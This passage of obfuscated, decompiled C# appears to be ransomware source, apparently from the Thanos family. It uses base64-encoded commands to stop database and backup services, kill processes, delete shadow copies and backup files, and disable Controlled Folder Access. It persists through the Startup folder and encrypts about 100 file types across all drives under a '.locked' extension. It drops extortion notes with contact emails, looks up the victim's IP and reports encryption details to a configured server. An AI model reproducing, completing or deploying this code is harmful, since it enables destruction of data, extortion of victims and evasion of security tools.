		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		tEHBqPAYINDcv("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		tEHBqPAYINDcv("c3RvcCBzd2lfZmlsdGVyIC95"),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		tEHBqPAYINDcv("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		tEHBqPAYINDcv("c3RvcCBzd2lfdXBkYXRlIC95"),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		tEHBqPAYINDcv("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		tEHBqPAYINDcv("c3RvcCBUbUNDU0YgL3k="),
		tEHBqPAYINDcv("c3RvcCBTUUxCcm93c2VyIC95"),
		tEHBqPAYINDcv("c3RvcCB0bWxpc3RlbiAveQ=="),
		tEHBqPAYINDcv("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBUcnVlS2V5IC95"),
		tEHBqPAYINDcv("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		tEHBqPAYINDcv("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		tEHBqPAYINDcv("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		tEHBqPAYINDcv("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		tEHBqPAYINDcv("c3RvcCBXUlNWQyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		tEHBqPAYINDcv("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> HUqifGdbadr = new List<string>
	{
		tEHBqPAYINDcv("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		tEHBqPAYINDcv("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		tEHBqPAYINDcv("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		tEHBqPAYINDcv("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> jVbZKZcmtZVW = new List<string>
	{
		tEHBqPAYINDcv("L0lNIG1zcHViLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIG15c3FsZC5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIGFnbnRzdmMuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIHRoZWJhdC5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIGVuY3N2Yy5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIENOVEFvU01nci5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIGRiZW5nNTAuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIG9jb21tLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIHpvb2x6LmV4ZSAvRg=="),
		tEHBqPAYINDcv("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIGRic25tcC5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIG1zcHViLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIG9uZW5vdGUuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIG91dGxvb2suZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIHZpc2lvLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIHdpbndvcmQuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIHdvcmRwYWQuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIG9jc3NkLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIG9yYWNsZS5leGUgL0Y="),
		tEHBqPAYINDcv("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		tEHBqPAYINDcv("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		tEHBqPAYINDcv("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> BulXSqrnEGw = new List<string>
	{
		tEHBqPAYINDcv("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		tEHBqPAYINDcv("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		tEHBqPAYINDcv("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> SiaPrJIaNChF = new List<string>
	{
		tEHBqPAYINDcv("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		tEHBqPAYINDcv("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		tEHBqPAYINDcv("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		tEHBqPAYINDcv("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		tEHBqPAYINDcv("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		tEHBqPAYINDcv("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string xxFVbyRHBfpUnc = "NO";

	public static string cwurltTlffPEF = "NO";

	internal static DateTime aEkYptXDUzUd = new DateTime(2000, 1, 1);

	internal static DateTime iUPzsdzrowMzDk = new DateTime(2100, 1, 1);

	public static string BJRJMRvLJvUy = "YES";

	public static string xUhpmBbRMOnPvOyQY = "10";

	public static string chDSctbegDK = "NO";

	public static string dyXFHOemtUUR = "NO";

	public static string edZjujyjDfS = "NO";

	public static string GOsnHslHhJI = "YES";

	public static string NhXjkhKqQiFqizbt = "NO";

	public static string dZaLbHeSffOykBlbqT = "NO";

	public static List<string> ptwMCNORHSBSo = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string vexuMasAzwGi = "NO";

	public static string ZaYuJzCvuUhm = "1";

	public static string kiPPdgbSFREcigUz = "YES";

	public static string nJvNerTaWtBL = "NO";

	public static string hgaiqytfYHbN = "NO";

	public static string yhMcbyErjAqsk = string.Empty;

	public static string eyeEmjyhpX = "NO";

	public static string DugYZpHSxnGtTcH = "YES";

	public static string bvbGdcllkgyto = "YES";

	public static string zRLJxwzheNLg = "SW5mb3JtYXRpb24uLi4=";

	public static string WRpoJrwFcVkpp = "WW91ciBuZXR3b3JrIHdhcyBBVFRBQ0tFRCwgeW91ciBjb21wdXRlcnMgYW5kIHNlcnZlcnMgd2VyZSBMT0NLRUQsDQpJdCBtZWFucyB0aGF0IHNvb24gbWFzcyBtZWRpYSwgeW91ciBwYXJ0bmVycyBhbmQgY2xpZW50cyBXSUxMIEtOT1cgYWJvdXQgeW91ciBQUk9CTEVNLg0KVG8gYXZvaWQgdGhpcyBpc3N1ZSB5b3UgYXJlIHRvIENPTUUgSU4gVE9VQ0ggV0lUSCBVUy4NCnJlc3RvcmVmaWxlc2VuY3J5cHRlZEBjb2NrLmxpDQpyZXN0b3JlZW5jcnlwdGVkQHNlY21haWwucHJv";

	public static string ahcGYAJuaR = "NO";

	public static string ablHrLwQgpa = "YES";

	public static string AyaMUSvKASQrXwE = "YES";

	public static string YXElgiiNPYfUKhT = "NO";

	public static string edByJxnImWnXyuXK = "NO";

	public static string MNpRiuecDY = "LOGONISOFF";

	public static string YzqcxQnfwXDiO = "NO";

	public static string AidMMpnxVnP = "YES";

	public static string AAsNehQDcrriH = "mystartup.lnk";

	public static string aaRiULuNabm = "NO";

	public static string eUnzhPnQoJDAd = "YES";

	public static string VltJkITgXffb = "NO";

	public static string OTcIywxSSHPZqmY = "NO";

	public static string HNNOfjJYKKEGv = "VGhhbm9z";

	public static string npFsXpbdmG = "YES";

	public static string cOFOfMtjlKwyG = "NO";

	public static string hgIVjpOrdBXn = "NO";

	public static string VpaPmeSOyEE = "NO";

	public static string[] BLJTUYOlQUp = new string[0];

	public static string QgGVhvIEkwK = "NO";

	public static bool qDwCLcYLcoNWFI = true;

	public static List<string> oJdFekDhqjyAJHw = new List<string>();

	public static List<string> qDhBgGHVUmwK = new List<string>();

	public static List<string> CTnMLFXURzdLx = new List<string>();

	private static void Main(string[] args)
	{
		try
		{
			LNCIzyIyMbNxlM.adVkEKOGYVAbXNh(vkbtWVhByfBlP);
		}
		catch (Exception)
		{
		}
		try
		{
			if (npFsXpbdmG == "YES")
			{
				Thread thread = new Thread(vFNcsAZLPr.QHyzpEGajJWP);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (zIsZFJMYVYryA == "YES")
		{
			Thread.Sleep(int.Parse(ffJKPbiimQKJed));
		}
		if (kiPPdgbSFREcigUz == "YES")
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					string[] cPxDzIWkyaMAP = new string[4]
					{
						tEHBqPAYINDcv("VGFza21ncg=="),
						tEHBqPAYINDcv("dGFza21ncg=="),
						tEHBqPAYINDcv("UHJvY2Vzc0hhY2tlcg=="),
						tEHBqPAYINDcv("cHJvY2V4cA==")
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						XdbgLnnHUFXLi.wLRBtzfOMJr(cPxDzIWkyaMAP);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				YkKPjyQPCdanO.WBaHHVhewiQ(tEHBqPAYINDcv("dGFza21ncg=="));
			}
			catch
			{
			}
			try
			{
				YkKPjyQPCdanO.WBaHHVhewiQ(tEHBqPAYINDcv("cHJvY2V4cA=="));
			}
			catch
			{
			}
			try
			{
				YkKPjyQPCdanO.WBaHHVhewiQ(tEHBqPAYINDcv("cHJvY2V4cDY0"));
			}
			catch
			{
			}
			try
			{
				YkKPjyQPCdanO.WBaHHVhewiQ(tEHBqPAYINDcv("UHJvY2Vzc0hhY2tlcg=="));
			}
			catch
			{
			}
			Thread thread3 = new Thread(XdbgLnnHUFXLi.QYrWxGSkZgse);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && NhXjkhKqQiFqizbt == "YES")
		{
			try
			{
				xHCzUjkOaL(tEHBqPAYINDcv("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		if (EKANxbdPUupX == "YES")
		{
			vCxOAbEqtCuJEx.akjkbxySVvsaRC();
		}
		if (TuvyUxGYwBHGK == "YES" && !XeoQXhoaylAmH.fWxmHjTRyHW())
		{
			XeoQXhoaylAmH.TaqVPwUruk();
		}
		if (tIpobfogipnBZgR == "YES" && XeoQXhoaylAmH.fWxmHjTRyHW())
		{
			new qKpUyQZRltiDbT().xbTVzktDHjFfpqbykG(qZWPkESzjFDGt: false);
			new qKpUyQZRltiDbT().ALeoHomuEQ();
		}
		if (mYqFUigNLAz == "YES")
		{
			ZcuLRUWjdHjgKCi.eoNINdwBptF();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (INBmIMSAfdxyP == "YES" && fileName != text2)
		{
			Thread thread4 = new Thread(RBNwRKGZdZfzuB);
			thread4.IsBackground = true;
			thread4.Priority = ThreadPriority.Normal;
			thread4.Start();
		}
		if (HWSgeZuYPZLOPAG == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				RYkOOzVuUrgx = vWVZkrrfmUbgZjU(0, EnhGvnHJKfwXzvmZ.Count);
				File.Copy(fileName, text + EnhGvnHJKfwXzvmZ[RYkOOzVuUrgx], overwrite: true);
				Process.Start(text + EnhGvnHJKfwXzvmZ[RYkOOzVuUrgx]);
				rGaFcSoQCZvEsGF();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (xxFVbyRHBfpUnc == "YES" && DateTime.Now < aEkYptXDUzUd)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (cwurltTlffPEF == "YES" && DateTime.Now > iUPzsdzrowMzDk)
			{
				rGaFcSoQCZvEsGF();
			}
		}
		catch
		{
		}
		Thread thread5 = new Thread((ThreadStart)delegate
		{
			foreach (string item in hIlxdLinSlxkY)
			{
				gDpzQqgYfCWc("net.exe", item);
			}
			foreach (string item2 in HUqifGdbadr)
			{
				gDpzQqgYfCWc("sc.exe", item2);
			}
			foreach (string item3 in jVbZKZcmtZVW)
			{
				gDpzQqgYfCWc("taskkill.exe", item3);
			}
			if (VpaPmeSOyEE == "YES")
			{
				string[] bLJTUYOlQUp = BLJTUYOlQUp;
				foreach (string text4 in bLJTUYOlQUp)
				{
					gDpzQqgYfCWc("taskkill.exe", "/IM " + text4 + " /f");
				}
			}
			foreach (string item4 in BulXSqrnEGw)
			{
				gDpzQqgYfCWc(tEHBqPAYINDcv("dnNzYWRtaW4uZXhl"), item4);
			}
			foreach (string item5 in SiaPrJIaNChF)
			{
				gDpzQqgYfCWc(tEHBqPAYINDcv("ZGVsLmV4ZQ=="), item5);
			}
		});
		thread5.Priority = ThreadPriority.Normal;
		thread5.Start();
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				Thread thread6 = new Thread(AdxkTRrIQTn.OldOaMPCMWPG);
				thread6.IsBackground = true;
				thread6.Start();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			gDpzQqgYfCWc("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin");
		}
		if (BFiHBHjLVBCP == "YES" && FXwamQtWCMstNuUpvQ() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread7 = new Thread(QZkYxCOnIUaFQzfJ.WqHXMEFOuVaJx);
			thread7.IsBackground = true;
			thread7.Priority = ThreadPriority.Normal;
			thread7.Start();
		}
		_ = EQpTjtwRmERwh == "YES";
		if (chDSctbegDK == "NO")
		{
			WrmiVjDyracfcM = BOuanIBcalKgyL.xzEJZEYlMEoWeQrO(32);
		}
		else
		{
			WrmiVjDyracfcM = "529JBGJKSWK6BQ3XL6JRYLAOPXZRPRIE";
		}
		string text3 = RBpOuRDExgT.WOJXStxiSqaqtS(WrmiVjDyracfcM);
		if (DugYZpHSxnGtTcH == "YES")
		{
			TQOKiPsjcMeFMoe();
		}
		JTZccBnyjlty.QdcdiDYTNRezA(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), AAsNehQDcrriH), ZrOilYuaRpvX(text3), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (ablHrLwQgpa == "YES")
		{
			try
			{
				NSEgaGtRKGSCL();
			}
			catch
			{
			}
		}
		try
		{
			vHPbaePxJs(new string[30]
			{
				"A:\\",
				"B:\\",
				"C:\\",
				"D:\\",
				"E:\\",
				"F:\\",
				"G:\\",
				"H:\\",
				"I:\\",
				"J:\\",
				"K:\\",
				"L:\\",
				"M:\\",
				"N:\\",
				"O:\\",
				"P:\\",
				"Q:\\",
				"R:\\",
				"S:\\",
				"T:\\",
				"U:\\",
				"V:\\",
				"W:\\",
				"X:\\",
				"Y:\\",
				"Z:\\",
				Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\",
				Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\",
				Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\",
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\"
			}, new string[100]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
				"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
				"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
				"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
			}, new string[0], WrmiVjDyracfcM, ".locked");
		}
		catch
		{
		}
		WrmiVjDyracfcM = BOuanIBcalKgyL.xzEJZEYlMEoWeQrO(32);
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt");
				streamWriter.WriteLine(tEHBqPAYINDcv("QXR0ZW50aW9uIQ0KDQpZb3VyIG5ldHdvcmsgd2FzIEFUVEFDS0VELCB5b3VyIGNvbXB1dGVycyBhbmQgc2VydmVycyB3ZXJlIExPQ0tFRCwNCkl0IG1lYW5zIHRoYXQgc29vbiBtYXNzIG1lZGlhLCB5b3VyIHBhcnRuZXJzIGFuZCBjbGllbnRzIFdJTEwgS05PVyBhYm91dCB5b3VyIFBST0JMRU0uDQpUbyBhdm9pZCB0aGlzIGlzc3VlIHlvdSBhcmUgdG8gQ09NRSBJTiBUT1VDSCBXSVRIIFVTLg0KcmVzdG9yZWZpbGVzZW5jcnlwdGVkQGNvY2subGkNCnJlc3RvcmVlbmNyeXB0ZWRAc2VjbWFpbC5wcm8="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(tEHBqPAYINDcv("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(text3);
				if (qjYyDXzYrwB == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(tEHBqPAYINDcv("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(lcwZgHzgRvhoMz.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + text3);
			}
		}
		catch
		{
		}
		foreach (string item6 in xNfCQSzUMjqNUFLU)
		{
			try
			{
				if (item6 == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item6 + "\\HOW_TO_DECYPHER_FILES.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", item6 + "\\HOW_TO_DECYPHER_FILES.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(item6 + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + text3);
				}
			}
			catch (Exception)
			{
			}
		}
		if (VltJkITgXffb == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta");
					streamWriter2.WriteLine(tEHBqPAYINDcv("MESSAGERICH"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(tEHBqPAYINDcv("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(text3 + tEHBqPAYINDcv("PC9wPg=="));
					if (qjYyDXzYrwB == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(tEHBqPAYINDcv("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + tEHBqPAYINDcv("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(lcwZgHzgRvhoMz.Count) + tEHBqPAYINDcv("PC9wPg=="));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta", tEHBqPAYINDcv("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + text3 + tEHBqPAYINDcv("PC9wPg=="));
				}
			}
			catch
			{
			}
		}
		if (TgxWuRriOF == "YES")
		{
			try
			{
				if (qjYyDXzYrwB == "NO")
				{
					ccEPHgfBCGDXR.ISlJkSqNIOOKS("URL", "USERNAME", "ACCESO", tEHBqPAYINDcv("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(tEHBqPAYINDcv("aHR0cDovL2ljYW5oYXppcC5jb20=")) + tEHBqPAYINDcv("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + tEHBqPAYINDcv("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(lcwZgHzgRvhoMz.Count) + "\r\n" + tEHBqPAYINDcv("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(lcwZgHzgRvhoMz) + "\r\n" + tEHBqPAYINDcv("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
				else
				{
					ccEPHgfBCGDXR.ISlJkSqNIOOKS("URL", "USERNAME", "ACCESO", tEHBqPAYINDcv("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + tEHBqPAYINDcv("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + tEHBqPAYINDcv("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(lcwZgHzgRvhoMz) + "\r\n" + tEHBqPAYINDcv("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
			}
			catch
			{
			}
		}
		if (MkccPpSJaMnKAD == "YES")
		{
			try
			{
				GVqDXXvuyKot.KARLWOrkJkQDqb(new Uri(""));
			}
			catch
			{
			}
		}
		if (VltJkITgXffb == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
				{
					Process.Start(tEHBqPAYINDcv("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
				{
					Process.Start(tEHBqPAYINDcv("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta");
				}
			}
			catch
			{
			}
		}
		if (DugYZpHSxnGtTcH == "YES")
		{
			if (bvbGdcllkgyto == "YES" && !string.IsNullOrEmpty(zRLJxwzheNLg) && !string.IsNullOrEmpty(WRpoJrwFcVkpp))
			{
